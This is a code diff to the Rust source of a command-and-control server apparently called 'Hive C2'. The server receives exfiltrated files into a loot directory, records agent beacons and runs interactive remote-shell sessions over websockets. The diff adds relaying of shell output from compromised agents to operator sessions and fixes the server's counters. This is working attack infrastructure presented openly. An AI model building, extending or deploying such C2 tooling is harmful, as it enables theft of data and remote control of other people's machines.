@@ -2,6 +2,7 @@ mod db;
 mod session;
 mod shell;
 
+use std::collections::HashMap;
 use std::net::SocketAddr;
 use std::path::PathBuf;
 use std::sync::Arc;
@@ -42,6 +43,7 @@ struct Args {
 struct AppState {
     db: Arc<Mutex<Db>>,
     sessions: Arc<Mutex<SessionManager>>,
+    relay: shell::RelayMap,
     loot_dir: PathBuf,
 }
 
@@ -120,6 +122,7 @@ async fn main() {
     let state = AppState {
         db: Arc::new(Mutex::new(db)),
         sessions: Arc::new(Mutex::new(sessions)),
+        relay: Arc::new(Mutex::new(HashMap::new())),
         loot_dir: args.loot_dir,
     };
 
@@ -137,10 +140,7 @@ async fn main() {
         .layer(CorsLayer::permissive())
         .with_state(state);
 
-    let addr = SocketAddr::new(
-        args.host.parse().expect("Invalid host address"),
-        args.port,
-    );
+    let addr = SocketAddr::new(args.host.parse().expect("Invalid host address"), args.port);
     tracing::info!("C2 Server listening on http://{addr}");
     tracing::info!("  POST /collect   - Receive exfiltrated data");
     tracing::info!("  POST /beacon    - Agent heartbeats");
@@ -154,19 +154,23 @@ async fn main() {
 }
 
 async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
-    let db = state.db.lock().await;
-    let (exfil_count, beacon_count) = db.counts();
+    let (exfil_count, beacon_count) = {
+        let db = state.db.lock().await;
+        db.counts()
+    };
+    let session_count = state.sessions.lock().await.list().len();
 
     Json(HealthResponse {
         status: "ok",
         exfil_count,
         beacon_count,
-        sessions: 0,
+        sessions: session_count,
     })
 }
 
 async fn index_handler() -> Html<&'static str> {
-    Html(r#"<!DOCTYPE html>
+    Html(
+        r#"<!DOCTYPE html>
 <html><head><title>Hive C2</title>
 <style>
 body{background:#0a0e14;color:#bfc7d5;font-family:monospace;padding:20px}
@@ -181,7 +185,8 @@ h1{color:#73d0a0}a{color:#5ccfe6}
 <a href=/admin/sessions>/admin/sessions</a> — Shell sessions<br>
 </div>
 <p style=color:#5c6773>Hive Colony v3.0 — Rust C2</p>
-</body></html>"#)
+</body></html>"#,
+    )
 }
 
 async fn logs_handler(State(state): State<AppState>) -> Json<Vec<LogEntry>> {
@@ -234,7 +239,7 @@ async fn collect_handler(
     };
     let size = raw.len();
 
-    let safe_name = filename.replace('/', "_").replace('\\', "_");
+    let safe_name = filename.replace(['/', '\\'], "_");
     let ts = chrono::Utc::now().format("%Y%m%d_%H%M%S");
     let filepath = state.loot_dir.join(format!("{ts}_{safe_name}"));
 
@@ -244,7 +249,7 @@ async fn collect_handler(
 
     {
         let db = state.db.lock().await;
-        db.record_exfil(&agent_id, &agent_role, &filename, size, &hash, &filepath);
+        db.record_exfil(agent_id, agent_role, &filename, size, &hash, &filepath);
     }
 
     tracing::info!(agent = %agent_id, role = %agent_role, file = %filename, size = %size, "Exfil received");
@@ -286,6 +291,17 @@ async fn beacon_handler(
         payload.agent_role = agent_role.to_string();
     }
 
+    // Stream shell results to the attached operator session, if any.
+    // A beacon frame of the form {"session": "...", "output": "..."} is a
+    // reply produced by an agent for an interactive shell task.
+    if let (Some(session), Some(output)) = (
+        payload.extra.get("session").and_then(|v| v.as_str()),
+        payload.extra.get("output").and_then(|v| v.as_str()),
+    ) {
+        let line = format!("[{session}] {output}");
+        shell::relay_to_session(&state, session, line).await;
+    }
+
     {
         let db = state.db.lock().await;
         db.record_beacon(
@@ -301,9 +317,13 @@ async fn beacon_handler(
 
     tracing::info!(agent = %agent_id, role = %agent_role, "Beacon received");
 
+    let beacon_count = {
+        let db = state.db.lock().await;
+        db.counts().1
+    };
     Json(serde_json::json!({
         "status": "ack",
-        "beacon_count": 0,
+        "beacon_count": beacon_count,
     }))
 }
 
@@ -335,9 +355,7 @@ async fn shell_handler(
     ws.on_upgrade(move |socket| shell::handle_shell(socket, state, session_id))
 }
 
-async fn admin_sessions_handler(
-    State(state): State<AppState>,
-) -> Json<Vec<shell::SessionInfo>> {
+async fn admin_sessions_handler(State(state): State<AppState>) -> Json<Vec<shell::SessionInfo>> {
     let sessions = state.sessions.lock().await;
     Json(sessions.list())
 }
